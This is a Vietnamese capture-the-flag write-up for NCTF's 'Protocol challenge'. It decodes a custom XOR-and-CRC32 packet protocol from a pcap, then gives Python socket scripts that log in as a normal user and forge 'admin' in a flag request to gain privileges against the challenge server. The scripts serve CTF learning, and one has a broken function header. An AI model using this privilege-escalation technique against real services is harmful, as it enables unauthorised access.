<img width="782" height="465" alt="Screenshot 2026-04-04 110651" src="https://github.com/user-attachments/assets/c0a23bdb-1de6-44ce-b6b3-7ad9f5d0aed0" />

Description: Mục tiêu thật sự là cố gắng nâng quyền thành admin để có thể lấy được flag cuối cùng, và chúng ta được cung cấp 1 file pcap

Ở chall này khi mở file pcap, lên mình sẽ để ý thấy có 3 luồng nhưng đều từ 2 địa chỉ ip conversation với nhau, điểm khác biệt nằm ở source port, và với mỗi một luồng như thế thì attacker và server có phần data bên trong khác nhau như sau:

<img width="1898" height="412" alt="image" src="https://github.com/user-attachments/assets/0c03af9d-7a2d-42ef-89c4-0cff2669e66e" />

Vì sao lại filter là: `tcp.payload && tcp.flags == 0x0018 && tcp.port == 24529`, khi mình thực hiện follows theo các gói tin được gửi đi bằng flags `PSH,ACK` mình sẽ thấy bên trogn gói tin có các payload sau:

```
GAME.&.d..5a$'=0#)<'v|l715:axd;014 "9#lyv2+0 wl>
GAME.2....5a9#=05!+and.-"'"*0f-11"+- ///'dba'2/7!5lyv#<1;4l>
GAME.&...}5a$'=0#)<'v|l715:axd;014 "9#lyv2+0 wl>
GAME.->..<5a9#=05!+and.014n-;2n%;3 'vjl0 ':6'dta14<,&d3
GAME.&.4..5a$'=0#)<'v|l715:axd;014 "9#lyv2+0 wl>
GAME.6 .#.5a9#=05!+and.-8?n"0+'-t%/-t!+7t ""3dba'2/7!5lyv#<1;4l>
```
Và khi phần payload trên cũng tuân thủ theo đúng file metadata mà mình được cung cấp trong challenge này:
```
const (
	Magic = 0x47414D45

	TypeAuth    = 0x01
	TypeQuery   = 0x02
	TypeGetFlag = 0x03

	HeaderSize = 10

	OffsetMagic    = 0
	OffsetType     = 4
	OffsetLength   = 5
	OffsetChecksum = 6
	OffsetPayload  = 10
)

var Key = []byte{0x4e, 0x43, 0x54, 0x46}

checksum := crc32.ChecksumIEEE(append(headerBytes, payloadBytes...))
```

Phần magic byte của gói tin chứa payload sẽ là chữ `GAME` - tương ứng với `0x47414D45 trong mã ASCII`, như chúng ta nhìn thấy, sau đó là `TypeAuth` chứa thông tin credential đã được mã hóa, và `TypeGetFlag` là loại credential nào sẽ được allow cho phép nhận được dữ liệu từ server. Quan trọng là phần `OffsetPayload` nằm ở byte thứ 10 trở về sau, sẽ chứa các request và response của attacker và server.

Chúng ta sẽ có 1 cấu trúc chung của gói tin được attacker gửi lên server sẽ là:
`Magic(4) + Type(1) + Length(1) + Checksum(4) + Payload`

Và trong tham số `Type` chứa 1 byte dùng để định dạng loại yêu cầu gửi đến server:
- `TypeAuth == 0x01` (Xác thực)
- `TypeQuery == 0x02` (Truy vấn thông tin hiện tại của phiên)
- `TypeGetFlag == 0x03` (lấy flag từ server)

Ở đây chúng ta thấy được bên trong file define protocol của các gói tin chứa payload, có một mảng `Key`, có thể được sử dụng cho phép XOR vòng lặp với phần payload từ byte 10 trở đi trong các gói tin.

Bây giờ mình sẽ thực hiện export các phần payload này vào các file `.txt` chứa payload theo mỗi port, cho quá trình decrypt và xem các luồng trò chuyện trở nên đơn giản hơn. Mình sử dụng lệnh tshark và export ra fields `tcp.payload`, đây là nơi chứa các gói tin bên trong có payload đã được decrypt.
```
┌──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/NCTF/Protocol challenge]
└─$ tshark -r test.pcapng -Y "tcp && tcp.flags == 0x0018 && tcp.port == 24529" -T fields -e tcp.payload > payload_port_24529 

                                                                                                                                        
┌──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/NCTF/Protocol challenge]
└─$ tshark -r test.pcapng -Y "tcp && tcp.flags == 0x0018 && tcp.port == 24600" -T fields -e tcp.payload > payload_port_24600 

                                                                                                                                        
┌──(nhduydeptrai㉿tobi)-[/mnt/…/kali_linux_real_machine/CTF/NCTF/Protocol challenge]
└─$ tshark -r test.pcapng -Y "tcp && tcp.flags == 0x0018 && tcp.port == 24651" -T fields -e tcp.payload > payload_port_24651 

```
Bên trong các các file sẽ chứa toàn bộ các luồng conversation của attacker và server như sau:

<img width="1102" height="403" alt="image" src="https://github.com/user-attachments/assets/f447da6e-ddac-4be7-b362-7edf48b8f424" />

Giờ mình sẽ viết 1 script sử dụng lệnh xor vòng lặp với phần payload của các gói tin:

```
import os

def decrypt_payloads(file_path):
    key = b"NCTF"
    
    # Kiểm tra xem file có tồn tại không
    if not os.path.exists(file_path):
        print(f"[Lỗi] Không tìm thấy file: {file_path}")
        return

    print(f"[*] Đang đọc và giải mã file: {file_path}\n" + "-"*40)

    with open(file_path, 'r') as file:
        lines = file.readlines()

    for line_num, hex_str in enumerate(lines, 1):
        hex_str = hex_str.strip()
        if not hex_str:
            continue  # Bỏ qua các dòng trống
            
        try:
            # Chuyển chuỗi hex thành mảng byte
            data = bytes.fromhex(hex_str)
        except ValueError:
            print(f"[Dòng {line_num}] Lỗi: Chuỗi hex không hợp lệ.")
            continue
            
        # Xử lý duyệt qua các byte để tách gói tin (dựa vào cấu trúc Header)
        idx = 0
        packet_num = 1
        
        while idx < len(data):
            # Tìm Magic word "GAME" (4 bytes)
            if data[idx:idx+4] == b'GAME':
                # Đảm bảo còn đủ 10 byte cho Header
                if idx + 10 <= len(data):
                    # Lấy trường Length ở offset 5
                    payload_length = data[idx + 5]
                    
                    payload_start = idx + 10
                    payload_end = payload_start + payload_length
                    
                    # Kiểm tra xem payload có bị thiếu hụt không
                    if payload_end <= len(data):
                        payload = data[payload_start:payload_end]
                        
                        # Giải mã bằng XOR lặp vòng
                        decrypted = bytearray()
                        for i in range(len(payload)):
                            decrypted.append(payload[i] ^ key[i % len(key)])
                        
                        # In kết quả
                        result_text = decrypted.decode('utf-8', errors='ignore')
                        print(f"[Dòng {line_num} - Gói {packet_num}]: {result_text}")
                        
                        # Dịch chuyển con trỏ qua phần payload vừa đọc để tìm gói tiếp theo
                        idx = payload_end
                        packet_num += 1
                        continue
            
            idx += 1

# Gọi hàm thực thi
if __name__ == "__main__":
    file_name = "payload_port_24529" 
    decrypt_payloads(file_name)

```

Sau đó chúng ta thực hiện chạy qua từng file chứa payload với các port `24529`, `24600`, `24651` để có được chuỗi payload chính, chứa cuộc trò chuyện của attacker với server

```
PS D:\kali-linux\CTF\NCTF\Protocol challenge> python3 .\script_decrypt.py     
[*] Đang đọc và giải mã file: payload_port_24529
----------------------------------------
[Dòng 1 - Gói 1]: {"password":"test","username":"test1"}
[Dòng 2 - Gói 1]: {"message":"Invalid credentials","status":"error"}
[Dòng 3 - Gói 1]: {"password":"test","username":"test1"}
[Dòng 4 - Gói 1]: {"message":"User not found","status":"error"}
[Dòng 5 - Gói 1]: {"password":"test","username":"test1"}
[Dòng 6 - Gói 1]: {"message":"Only admin can get flag","status":"error"}

PS D:\kali-linux\CTF\NCTF\Protocol challenge> python3 .\script_decrypt.py     
[*] Đang đọc và giải mã file: payload_port_24600
----------------------------------------
[Dòng 1 - Gói 1]: {"password":"NCTF2026","username":"ctfer"}
[Dòng 2 - Gói 1]: {"message":"Authenticated","status":"ok"}
[Dòng 3 - Gói 1]: {"password":"NCTF2026","username":"ctfer"}
[Dòng 4 - Gói 1]: {"data":{"level":"1","username":"ctfer"},"status":"ok"}     
[Dòng 5 - Gói 1]: {"password":"NCTF2026","username":"ctfer"}
[Dòng 6 - Gói 1]: {"message":"Only admin can get flag","status":"error"}

PS D:\kali-linux\CTF\NCTF\Protocol challenge> python3 .\script_decrypt.py
[*] Đang đọc và giải mã file: payload_port_24651
----------------------------------------
[Dòng 1 - Gói 1]: {"username":"ctfer","password":"NCTF2026"}
[Dòng 2 - Gói 1]: {"username":"test2","password":"test"}
[Dòng 3 - Gói 1]: {"message":"Authenticated","status":"ok"}
[Dòng 4 - Gói 1]: {"message":"Invalid credentials","status":"error"}
```

Ở đây khi mình phân tích qua luồng đầu tiên ở port `24529` mình sẽ thấy lúc này attacker đang thực hiện test khả năng kết nối với server, bằng cách gửi đi các credential như `usern=test` và `passwd=test1`, để xem server có phản hồi khong, và chúng ta cũng biết được là ở đây, admin mới có quyền xem được flag

Sau đó ở luồng thứ 2 ở port `24600` mình sẽ thấy lúc này attacker đang sử dụng các credential chính thức để cổ gắng xâm nhập được vào hệ thống, và chúng ta có thể để ý. Với `passwd=NCTF2026` và `usern=ctfer` thì attacker đã thành công đăng nhập được vào server, đây là lúc gói tin sử dụng byte `Type` bên trong cấu trúc mà mình đã nhắc đến ban đầu. 
- Request đầu tiên trong port `24600` attacker gửi `Type == 0x01` để thực hiện xác thực thông tin, và đã được xác nhận.
  
- Request thứ 2 attacker gửi `Type == 0x02` để truy vấn thông tin hiện tại trong server.

- Request thứ 3 thì attacker bắt đầu gửi `Type == 0x03` yêu cầu nhận flag và bị từ chối.

Và ở luồng cuối cùng thì sau khi đăng nhập thành công bằng passwd và usern đó, thì attacker tiếp tục 
sử dụng credentials `test` và `Type = 0x01` để xác nhận credential nhưng đã bị từ chối invalid.

> Qua các log trên, thì chúng ta sẽ để ý một cấu trúc request gửi đi của attacker đến server, và cách server nhận 1 request từ client khá bất thường. Đó là trong 1 web server thông thường, thi user login success với credential `..`, server sẽ gửi cho client một `token/cookie` để các request sau chỉ cần gửi đó lên.
>
> Nhưng đối với server này, thì attacker cần thực hiện gửi thêm credential trong json `{password:.., username:...}`, để liên tục nhớ xác nhận client, thay vì truy xuất từ database. Khi đó ở byte `Type ==0x03` chúng ta có thể thực hiện thay đổi cục `usernam` trong JSON, bởi vì server nó không truy xuất dữ liệu trên database mà lại truy xuất bên trong json được gửi kèm `Type`.

Mình nghĩ ở đây khi chúng ta thực hiện đăng nhập thành công với username là `ctfer`, để lấy được phiên đăng nhập, sau đó sửa lại thông tin trong json từ username `ctfer` -> `admin` sẽ có thể lấy flag.

Bây giờ mình bắt đầu thử nghiệm có kết nối được với server chưa:

Dùng username fake để thực hiện xem có kết nối được không
```

import socket
import struct
import zlib
import time

HOST = "114.66.24.221"
PORT = 43573  # Chú ý cập nhật Port mới nếu Instance vừa bị reset nhé!
KEY = b"NCTF"

def build_packet(msg_type, payload_dict):
    """Đóng gói mọi loại message theo chuẩn GAME protocol"""
    import json
    # Convert dict to JSON string matching the exact format
    payload = json.dumps(payload_dict, separators=(',', ':')).encode('utf-8')
    
    # XOR
    enc_payload = bytes([payload[i] ^ KEY[i % 4] for i in range(len(payload))])
    
    # Checksum (CRC32)
    header_draft = struct.pack('>4sBB', b'GAME', msg_type, len(enc_payload))
    checksum = zlib.crc32(header_draft + b'\x00\x00\x00\x00' + enc_payload) & 0xffffffff
    
    return struct.pack('>4sBBI', b'GAME', msg_type, len(enc_payload), checksum) + enc_payload

def recv_packet(s, step_name):
    """Hàm nhận và in kết quả chung"""
    try:
        header = s.recv(10)
        if len(header) != 10:
            print(f"[-] {step_name} thất bại: Server đóng kết nối hoặc trả thiếu Header ({len(header)} bytes).")
            return None
            
        _, _, payload_len, _ = struct.unpack('>4sBBI', header)
        
        enc_resp = b""
        while len(enc_resp) < payload_len:
            chunk = s.recv(payload_len - len(enc_resp))
            if not chunk: break
            enc_resp += chunk
            
        dec_resp = bytes([enc_resp[i] ^ KEY[i % 4] for i in range(len(enc_resp))])
        print(f"[+] Phản hồi từ {step_name}: {dec_resp.decode('utf-8', errors='ignore')}")
        return dec_resp
    except Exception as e:
        print(f"[-] Lỗi khi nhận {step_name}: {e}")
        return None

 print(f"[*] Đang kết nối {HOST}:{PORT} ...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((HOST, PORT))
        print("[+] Kết nối TCP Handshake thành công!")

        creds = {"password":"uchihahahah","username":"t0b1"}

        # --- BƯỚC 1: XÁC THỰC ---
        print("\n[*] 1. Gửi gói TypeAuth (0x01)...")
        s.sendall(build_packet(0x01, creds))
        time.sleep(0.5)
        recv_packet(s, "Auth")

        # --- BƯỚC 2: LẤY CỜ ---
        print("\n[*] 2. Gửi gói TypeGetFlag (0x03)...")
        s.sendall(build_packet(0x03, creds))
        time.sleep(0.5)
        recv_packet(s, "GetFlag")

    except ConnectionResetError:
        print("\n[-] Lỗi 10054: Server vẫn cố tình ngắt kết nối! Cấu trúc gói tin có thể bị sai Endianness.")
    except Exception as e:
        print(f"\n[-] Lỗi mạng: {e}")
    finally:
        if 's' in locals():
            s.close()
            print("\n[*] Đã đóng socket.")

    
if __name__ == "__main__":
    main()


```


<img width="1767" height="339" alt="image" src="https://github.com/user-attachments/assets/80dafff4-3f5f-4358-8c60-ac8e366762ea" />

Khi thành công mình thực hiện đăng nhập bằng username `ctfer` để lấy phiên đăng nhập và cũng thực hiện sửa `username` bên trong json, để thực hiện leo quyền và lấy flag:

```

import socket
import struct
import zlib
import time

HOST = "114.66.24.221"
PORT = 43573 
KEY = b"NCTF"

def build_packet(msg_type, payload_dict):
    """Đóng gói mọi loại message theo chuẩn GAME protocol"""
    import json
    # Convert dict to JSON string matching the exact format
    payload = json.dumps(payload_dict, separators=(',', ':')).encode('utf-8')
    
    # XOR
    enc_payload = bytes([payload[i] ^ KEY[i % 4] for i in range(len(payload))])
    
    # Checksum (CRC32)
    header_draft = struct.pack('>4sBB', b'GAME', msg_type, len(enc_payload))
    checksum = zlib.crc32(header_draft + b'\x00\x00\x00\x00' + enc_payload) & 0xffffffff
    
    return struct.pack('>4sBBI', b'GAME', msg_type, len(enc_payload), checksum) + enc_payload

def recv_packet(s, step_name):
    """Hàm nhận và in kết quả chung"""
    try:
        header = s.recv(10)
        if len(header) != 10:
            print(f"[-] {step_name} thất bại: Server đóng kết nối hoặc trả thiếu Header ({len(header)} bytes).")
            return None
            
        _, _, payload_len, _ = struct.unpack('>4sBBI', header)
        
        enc_resp = b""
        while len(enc_resp) < payload_len:
            chunk = s.recv(payload_len - len(enc_resp))
            if not chunk: break
            enc_resp += chunk
            
        dec_resp = bytes([enc_resp[i] ^ KEY[i % 4] for i in range(len(enc_resp))])
        print(f"[+] Phản hồi từ {step_name}: {dec_resp.decode('utf-8', errors='ignore')}")
        return dec_resp
    except Exception as e:
        print(f"[-] Lỗi khi nhận {step_name}: {e}")
        return None

def main():
    print(f"[*] Đang kết nối {HOST}:{PORT} ...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((HOST, PORT))
        print("[+] Kết nối TCP Handshake thành công!")

        auth_creds = {"password": "NCTF2026", "username": "ctfer"}
        
        print("\n[*] 1. Gửi gói TypeAuth (0x01) với ctfer...")
        s.sendall(build_packet(0x01, auth_creds))
        time.sleep(0.5)
        recv_packet(s, "Auth")

        flag_creds = {"password": "NCTF2026", "username": "admin"} 
        
        print("\n[*] 2. Gửi gói TypeGetFlag (0x03) giả mạo admin...")
        s.sendall(build_packet(0x03, flag_creds))
        time.sleep(0.5)
        recv_packet(s, "GetFlag")

    except Exception as e:
        print(f"\n[-] Lỗi: {e}")
    finally:
        if 's' in locals():
            s.close()
            print("\n[*] Đã đóng socket.")

if __name__ == "__main__":
    main()


```

<img width="1444" height="257" alt="image" src="https://github.com/user-attachments/assets/e93a13a2-6511-4c39-a06e-29895a9477e4" />

**Flag: NCTF{6f745f13-5388-4285-9e90-4b2868f70eff}**

### Kỹ thuật

Trong bài này thì mình chỉ đơn giản là khai thác vào lỗ hổng login của server, thay vì thực hiện truy xuất database cho các request sau của user sau khi logon, để cung cấp cookie/token. Thì server lại thực hiện yêu cầu gửi 1 cục json chứa credential và thực hiện truy xuất từ phần credential đó để xử lý các yêu cầu trong `Type`, và khi gửi 1 `Type == 0x03` server đã chấp nhận phiên kết nối thành công từ trước -> Truy xuất cục json và thấy `username == admin` -> Nhả flag.


